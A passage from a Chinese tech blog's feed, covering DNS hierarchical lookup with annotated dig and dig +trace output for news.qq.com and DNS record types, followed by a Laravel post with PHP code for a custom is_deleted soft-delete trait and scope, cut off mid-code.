先生来找门卫大爷询问「北海公园」的地址，门卫大爷会先看一下自己的笔记本，找找看之前有没有人问过北海公园，如果没有，他就会拨打内线去找局长求助。局长说北海是西城区，你去问负责西城区道路信息的赵部长吧。门卫大爷又去问赵部长，赵部长查了一下，说这个地址你去问负责核心区的钱处长吧。门卫大爷又给钱处长打过去电话，钱处长说这个地址我也不掌握啊，你去问一下负责景山片区的科员小孙吧。门卫大爷从小孙那里终于知道了北海公园地址，他赶紧记到自己的小本本上，然后把结果告诉了市民 A 先生。接下来一小时内，如果还有市民 B 先生再来问北海公园的话，门卫大爷就直接用笔记本上记载的结果回复了。当然，如果市民 C 女士过来问别的地址的话，门卫大爷就要把处理 A 先生问询的流程再走一遍了。</p><h3 id="分级查询的实例"><a href="#分级查询的实例" class="headerlink" title="分级查询的实例"></a>分级查询的实例</h3><p>现在我们来看一个实际的例子。如果我们在浏览器中输入<code>https://news.qq.com</code>，那浏览器会从接收到的 URL 中抽取出域名字段（news.qq.com），然后将它传给 DNS 客户端（操作系统提供）来解析。</p><p>首先我们说明一下本机 DNS 配置（就是 <code>/etc/resolv.conf</code> 文件，里面指定了本地 DNS 服务器的地址，Windows 系统可能会有所不同）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/resolv.conf </span></span><br><span class="line">nameserver 202.106.0.20</span><br><span class="line">nameserver 202.106.196.115</span><br></pre></td></tr></table></figure><p>然后我们用 dig 这个工具查看一下 news.qq.com 的解析结果（其中中文部分是解释说明）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">$ dig news.qq.com</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; news.qq.com</span><br><span class="line">这是 dig 程序的版本号与要查询的域名</span><br><span class="line"></span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">以下是要获取的内容。</span><br><span class="line"></span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 47559</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class="line">这个是返回应答的头部信息：</span><br><span class="line">1. opcode：操作码，QUERY 代表查询操作；</span><br><span class="line">2. status: 状态，NOERROR 代表没有错误;</span><br><span class="line">3. id：编号，在 DNS 协议中通过编号匹配返回和查询；</span><br><span class="line">4. flags: 标志，含义如下:</span><br><span class="line">   - qr：query，查询标志，代表是查询操作</span><br><span class="line">   - rd：recursion desired，代表希望进行递归查询操作;</span><br><span class="line">   - ra：recursive available，代表查询的服务器支持递归查询操作;</span><br><span class="line">5. QUERY 查询数，与下面 QUESTION SECTION 的记录数一一对应；</span><br><span class="line">6. ANSWER 结果数，与下面的 ANSWER SECTION 的记录数一一对应；</span><br><span class="line">7. AUTHORITY 权威回复数，如果查询结果由管理域名的域名服务器而不是缓存服务器提供的，则称为权威回复。</span><br><span class="line">             0 表示所有结果都不是权威回复；</span><br><span class="line">8. ADDITIONAL 额外记录数；</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;news.qq.com.INA</span><br><span class="line">查询部分,从左到右部分意义如下:</span><br><span class="line">1、要查询的域名；</span><br><span class="line">2、要查询信息的类别，IN 代表类别为 IP 协议，即 Internet。</span><br><span class="line">3、查询的记录类型，A 记录(Address)代表要查询 IPv4 地址。</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">news.qq.com.136INCNAMEhttps.qq.com.</span><br><span class="line">https.qq.com.476INA125.39.52.26</span><br><span class="line">回应部分，从左到右各部分意义：</span><br><span class="line">1、对应的域名</span><br><span class="line">2、TTL，time to live，缓存时间，单位秒，代表缓存域名服务器可以在缓存中保存的期限。</span><br><span class="line">3、查询信息的类别</span><br><span class="line">4、查询的记录类型，CNAME 表示别名记录，A 记录(Address)代表 IPv4 地址。</span><br><span class="line">5、域名对应的 ip 地址。</span><br><span class="line"></span><br><span class="line">;; Query time: 56 msec</span><br><span class="line">;; SERVER: 202.106.0.20#53(202.106.0.20)</span><br><span class="line">查询使用的服务器地址和端口,其实就是本地 DNS 域名服务器</span><br><span class="line">;; WHEN: Thu Jul 11 15:59:37 CST 2019</span><br><span class="line">;; MSG SIZE  rcvd: 65</span><br><span class="line">查询的时间与回应的大小，收到 65 字节的应答数据。</span><br></pre></td></tr></table></figure><p>从这个应答可以看到，我们得到的结果不是权威回复，只是本地 DNS 服务器从缓存中给了应答。</p><p>接下来我们在 dig 命令中增加一个参数 <code>+trace</code>，看看完整的分级查询过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">$ dig +trace news.qq.com</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; +trace news.qq.com</span><br><span class="line">;; global options: +cmd</span><br><span class="line">.432944INNSg.root-servers.net.</span><br><span class="line">.432944INNSk.root-servers.net.</span><br><span class="line">.432944INNSb.root-servers.net.</span><br><span class="line">.432944INNSh.root-servers.net.</span><br><span class="line">.432944INNSi.root-servers.net.</span><br><span class="line">.432944INNSf.root-servers.net.</span><br><span class="line">.432944INNSd.root-servers.net.</span><br><span class="line">.432944INNSe.root-servers.net.</span><br><span class="line">.432944INNSj.root-servers.net.</span><br><span class="line">.432944INNSl.root-servers.net.</span><br><span class="line">.432944INNSc.root-servers.net.</span><br><span class="line">.432944INNSm.root-servers.net.</span><br><span class="line">.432944INNSa.root-servers.net.</span><br><span class="line">;; Received 228 bytes from 202.106.0.20#53(202.106.0.20) in 45 ms</span><br><span class="line">这些就是神秘的根域名服务器，由本地 DNS 服务器返回了所有根域名服务器地址。</span><br><span class="line"></span><br><span class="line">com.172800INNSg.gtld-servers.net.</span><br><span class="line">com.172800INNSa.gtld-servers.net.</span><br><span class="line">com.172800INNSb.gtld-servers.net.</span><br><span class="line">com.172800INNSm.gtld-servers.net.</span><br><span class="line">com.172800INNSd.gtld-servers.net.</span><br><span class="line">com.172800INNSc.gtld-servers.net.</span><br><span class="line">com.172800INNSj.gtld-servers.net.</span><br><span class="line">com.172800INNSh.gtld-servers.net.</span><br><span class="line">com.172800INNSf.gtld-servers.net.</span><br><span class="line">com.172800INNSl.gtld-servers.net.</span><br><span class="line">com.172800INNSe.gtld-servers.net.</span><br><span class="line">com.172800INNSk.gtld-servers.net.</span><br><span class="line">com.172800INNSi.gtld-servers.net.</span><br><span class="line">;; Received 1171 bytes from 192.36.148.17#53(i.root-servers.net) in 57 ms</span><br><span class="line">这里显示的是 .com 域名的 13 条 NS 记录，本地 DNS 服务器向这些顶级域名服务器发出查询请求，</span><br><span class="line">询问 qq.com 的 NS 记录。</span><br><span class="line"></span><br><span class="line">qq.com.172800INNSns1.qq.com.</span><br><span class="line">qq.com.172800INNSns2.qq.com.</span><br><span class="line">qq.com.172800INNSns3.qq.com.</span><br><span class="line">qq.com.172800INNSns4.qq.com.</span><br><span class="line">;; Received 805 bytes from 192.48.79.30#53(j.gtld-servers.net) in 331 ms</span><br><span class="line">这里显示的是 qq.com 的 4 条 NS 记录，由 j.gtld-servers.net 这台服务器最先返回。</span><br><span class="line">然后本地 DNS 服务器向这四台服务器查询下一级域名 news.qq.com 的 NS 记录。</span><br><span class="line"></span><br><span class="line">news.qq.com.86400INNSns-cnc1.qq.com.</span><br><span class="line">news.qq.com.86400INNSns-cnc2.qq.com.</span><br><span class="line">;; Received 180 bytes from 58.144.154.100#53(ns4.qq.com) in 37 ms</span><br><span class="line">这里显示的是 news.qq.com 的 NS 记录，它们是由上面的 ns4.qq.com 域名服务器返回的。</span><br><span class="line">然后本地 DNS 服务器向这两台机器查询 news.qq.com 的主机名。</span><br><span class="line"></span><br><span class="line">news.qq.com.600INCNAMEhttps.qq.com.</span><br><span class="line">https.qq.com.600INA125.39.52.26</span><br><span class="line">;; Received 76 bytes from 223.167.83.104#53(ns-cnc2.qq.com) in 29 ms</span><br><span class="line">这是上面的 ns-cnc2.qq.com 返回的最终查询结果：</span><br><span class="line">news.qq.com 是 https.qq.com 的别名，而 https.qq.com 的 A 记录地址是 125.39.52.26</span><br></pre></td></tr></table></figure><p>实际的流程里面，本地 DNS 服务器相当于门卫大爷，根域名服务器相当于局长同志，其余以此类推。客户端与本地 DNS 服务器之间的查询叫递归查询，本地 DNS 服务器与其他域名服务器之间的查询就叫迭代查询。</p><h2 id="域名记录的类型"><a href="#域名记录的类型" class="headerlink" title="域名记录的类型"></a>域名记录的类型</h2><p>域名服务器之所以能知道域名与 IP 地址的映射信息，是因为我们在域名服务商那里提交了域名记录。购买了一个域名之后，我们需要在域名服务商那里设置域名解析的记录，域名服务商把这些记录推送到权威域名服务器，这样我们的域名才能正式生效。</p><p>在设置域名记录的时候，会遇到「A 记录」、「CNAME」 等不同类型，这正是前面做域名解析的时候我们碰到的结果。这些类型是什么意思，它们之间有什么区别呢？接下来我们看看常见的记录类型。</p><ul><li><strong>A 记录</strong>。A (Address) 记录用来直接指定主机名（或域名）对应的 IP 地址。主机名就是域名前缀，常见有如下几种：<ul><li><code>www</code>：解析后的域名为 <a href="http://www.0x2beace.com，一般用于网站地址。" target="_blank" rel="noopener">www.0x2beace.com，一般用于网站地址。</a></li><li><code>@</code>：直接解析主域名。</li><li><code>*</code>：泛解析，指将 *.yourdomain.com 解析到同一 IP。</li></ul></li><li><strong>CNAME 记录</strong>。CNAME 的全称是 Canonical Name，通常称别名记录。如果需要将域名指向另一个域名，再由另一个域名提供 IP 地址，就需要添加 CNAME 记录。</li><li>MX 记录。邮件交换记录，用于将以该域名为结尾的电子邮件指向对应的邮件服务器以进行处理。</li><li>NS 记录。域名服务器记录，如果需要把子域名交给其他 DNS 服务器解析，就需要添加 NS 记录。</li><li>AAAA 记录。用来指定主机名（或域名）对应的 IPv6 地址，不常用。</li><li>TXT 记录。可以填写任何东西，长度限制 255。绝大多数的 TXT 记录是用来做 SPF 记录（反垃圾邮件），MX 记录的作用是给寄信者指明某个域名的邮件服务器有哪些。SPF 的作用跟 MX 相反，它向收信者表明，哪些邮件服务器是经过某个域名认可会发送邮件的。</li><li>显性 URL。从一个地址 301 重定向（也叫「永久性转移」）到另一个地址的时候，就需要添加显性 URL 记录。</li><li>隐性 URL。从一个地址 302 跳转（也叫「临时跳转」）到另一个地址，需要添加隐性 URL 记录。它类似于显性 URL，区别在于隐性 URL 不会改变地址栏中的域名。</li></ul><p>在填写各种记录的时候，我们还会碰到一个特殊的设置项——TTL，生存时间（Time To Live）。</p><p>TTL表示解析记录在 DNS 服务器中的缓存时间，时间长度单位是秒，一般为3600秒。比如：在访问<code>news.qq.com</code> 时，如果在 DNS 服务器的缓存中没有该记录，就会向某个 NS 服务器发出请求，获得该记录后，该记录会在 DNS 服务器上保存TTL的时间长度，在TTL有效期内访问 <code>news.qq.com</code>，DNS 服务器会直接缓存中返回刚才的记录。</p><h2 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a>原文链接</h2><ul><li><a href="https://leancloudblog.com/Domain-Name-Story-confirm/" target="_blank" rel="noopener">域名背后那些事</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 域名 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何更好的使用 Laravel 软删除</title>
      <link href="/how-to-better-use-laravel-soft-delete/"/>
      <url>/how-to-better-use-laravel-soft-delete/</url>
      
        <content type="html"><![CDATA[<p>通常对于数据库中比较重要的数据，不会直接删除，而是采用软删除。</p><a id="more"></a><p>Laravel 的Eloquent 也提供相应的功能达到软删除模型的目的，不过个人觉得Laravel 的软删除存在一些问题：</p><blockquote><p>Laravel中使用了一个日期字段作为标识状态，<code>deleted_at</code> 默认值为<code>NULL</code>，如果记录被删除了，<code>deleted_at</code> 的值则为当前时间戳，所以只能通过<code>is null</code> or <code>not is null</code>查询一条记录是否被删除，这会导致Mysql 引擎放弃使用索引而进行全表扫描，查询效率可想而知。</p></blockquote><p>可以通过重写<code>SoftDeletes.php</code> 类来修改Laravel SoftDelete 的逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">Traits</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">SoftDeletes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> SoftDeletesEx &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">use</span> <span class="title">SoftDeletes</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Boot the soft deleting trait for a model.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">bootSoftDeletes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">static</span>::addGlobalScope(<span class="keyword">new</span> SoftDeletingScopeEx());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the name of the "deleted at" column.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getDeletedAtColumn</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 自定义标识字段</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'is_deleted'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Perform the actual delete query on this model instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">runSoftDelete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $query = <span class="keyword">$this</span>-&gt;newQueryWithoutScopes()-&gt;where(<span class="keyword">$this</span>-&gt;getKeyName(), <span class="keyword">$this</span>-&gt;getKey());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 0. 正常 1. 已删除</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;getDeletedAtColumn()&#125; = $time = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        $query-&gt;update([</span><br><span class="line">            <span class="keyword">$this</span>-&gt;getDeletedAtColumn() =&gt; $time</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Restore a soft-deleted model instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool|null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">restore</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// If the restoring event does not return false, we will proceed with this</span></span><br><span class="line">        <span class="comment">// restore operation. Otherwise, we bail out so the developer will stop</span></span><br><span class="line">        <span class="comment">// the restore totally. We will clear the deleted timestamp and save.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;fireModelEvent(<span class="string">'restoring'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;getDeletedAtColumn()&#125; = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Once we have saved the model, we will fire the "restored" event so this</span></span><br><span class="line">        <span class="comment">// developer will do anything they need to after a restore operation is</span></span><br><span class="line">        <span class="comment">// totally finished. Then we will return the result of the save call.</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;exists = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;save();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;fireModelEvent(<span class="string">'restored'</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Determine if the model instance has been soft-deleted.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">trashed</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ! (<span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;getDeletedAtColumn()&#125; === <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过定义<code>is_deleted</code> 字段来标示是否删除，默认值<code>0. 未删除</code>，<code>1. 已删除</code>，同时给该字段添加普通索引。</p><p>接着还需要重写<code>SoftDeletingScope.php</code> 类，约束默认查询<code>is_deleted = 0</code> 的记录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">Traits</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Builder</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">SoftDeletingScope</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoftDeletingScopeEx</span> <span class="keyword">extends</span> <span class="title">SoftDeletingScope</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将约束加到 Eloquent 查询构造中，这样默认查询的就是 `is_deleted` = 0 的记录了</span></span><br><span class="line"><span class="comment">     * Apply the scope to a given Eloquent query builder.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \Illuminate\Database\Eloquent\Builder $builder</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \Illuminate\Database\Eloquent\Model $model</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">apply</span><span class="params">(Builder $builder, Model $model)</span> </span>&#123;</span><br><span class="line">        $builder-&gt;where($model-&gt;getQualifiedDeletedAtColumn(), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Extend the query builder with the needed functions.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \Illuminate\Database\Eloquent\Builder $builder</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">extend</span><span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;extensions <span class="keyword">as</span> $extension) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="string">"add&#123;$extension&#125;"</span>&#125;($builder);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $builder-&gt;onDelete(<span class="function"><span class="keyword">function</span> <span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">            $column = <span class="keyword">$this</span>-&gt;getDeletedAtColumn($builder);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $builder-&gt;update([</span><br><span class="line">                $column =&gt; \DB::Raw(<span class="string">'UNIX_TIMESTAMP(NOW())'</span>)</span><br><span class="line">            ]);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add the restore extension to the builder.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \Illuminate\Database\Eloquent\Builder $builder</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addRestore</span><span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">        $builder-&gt;macro(<span class="string">'restore'</span>, <span class="function"><span class="keyword">function</span> <span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">            $builder-&gt;withTrashed();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $builder-&gt;update([</span><br><span class="line">                $builder-&gt;getModel()</span><br><span class="line">                    -&gt;getDeletedAtColumn() =&gt; <span class="number">0</span></span><br><span class="line">            ]);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add the without-trashed extension to the builder.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \Illuminate\Database\Eloquent\Builder $builder</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addWithoutTrashed</span><span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">        $builder-&gt;macro(<span class="string">'withoutTrashed'</span>, <span class="function"><span class="keyword">function</span> <span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">            $model = $builder-&gt;getModel();</span><br><span class="line"></span><br><span class="line">            $builder-&gt;withoutGlobalScope(<span class="keyword">$this</span>)</span><br><span class="line">                -&gt;where($model-&gt;getQualifiedDeletedAtColumn(), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $builder;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add the only-trashed extension to the builder.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> 